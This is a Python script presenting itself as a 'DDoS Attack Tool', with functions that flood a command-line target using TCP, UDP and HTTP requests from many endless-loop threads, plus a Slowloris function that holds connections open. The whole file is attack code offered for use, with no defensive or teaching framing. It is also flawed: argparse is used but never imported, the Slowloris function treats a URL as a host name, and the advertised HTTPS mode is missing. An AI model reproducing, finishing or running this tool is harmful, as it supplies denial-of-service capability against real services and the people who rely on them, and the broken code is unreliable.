#!/usr/bin/python3
"""
DDoS Attack Tool
TCP, UDP, HTTP, HTTPS, Flood, Slowloris
"""

import socket
import threading
import time
import requests
import sys

def tcp_attack(target_ip, target_port, threads=100):
    """TCP Flood Attack"""
    def tcp_thread():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(b'A' * 1000)
                s.close()
            except:
                pass
                
    for _ in range(threads):
        threading.Thread(target=tcp_thread).start()

def udp_attack(target_ip, target_port, threads=100):
    """UDP Flood Attack"""
    def udp_thread():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'A' * 1000, (target_ip, target_port))
            except:
                pass
                
    for _ in range(threads):
        threading.Thread(target=udp_thread).start()

def http_attack(target_url, threads=100):
    """HTTP Flood Attack"""
    def http_thread():
        while True:
            try:
                requests.get(target_url, timeout=1)
            except:
                pass
                
    for _ in range(threads):
        threading.Thread(target=http_thread).start()

def slowloris_attack(target_url, threads=100):
    """Slowloris Attack"""
    def slowloris_thread():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, 80))
            s.send(b"GET /? HTTP/1.1\r\n")
            s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n")
            s.send(b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
            s.send(b"Accept-Language: en-US,en;q=0.9\r\n")
            s.send(b"Accept-Encoding: gzip, deflate\r\n")
            s.send(b"Connection: keep-alive\r\n\r\n")
            
            while True:
                time.sleep(10)
                s.send(b"A" * 1000)
                
        except:
            pass
            
    for _ in range(threads):
        threading.Thread(target=slowloris_thread).start()

def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Tool')
    parser.add_argument('target', help='Target IP or URL')
    parser.add_argument('--tcp', action='store_true', help='TCP Flood')
    parser.add_argument('--udp', action='store_true', help='UDP Flood')
    parser.add_argument('--http', action='store_true', help='HTTP Flood')
    parser.add_argument('--slowloris', action='store_true', help='Slowloris Attack')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads')
    
    args = parser.parse_args()
    
    if not any([args.tcp, args.udp, args.http, args.slowloris]):
        parser.error('At least one attack type must be selected')
    
    try:
        if args.tcp:
            tcp_attack(args.target, 80, args.threads)
        if args.udp:
            udp_attack(args.target, 53, args.threads)
        if args.http:
            http_attack(args.target, args.threads)
        if args.slowloris:
            slowloris_attack(args.target, args.threads)
            
        print("[+] Attack started...")
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()
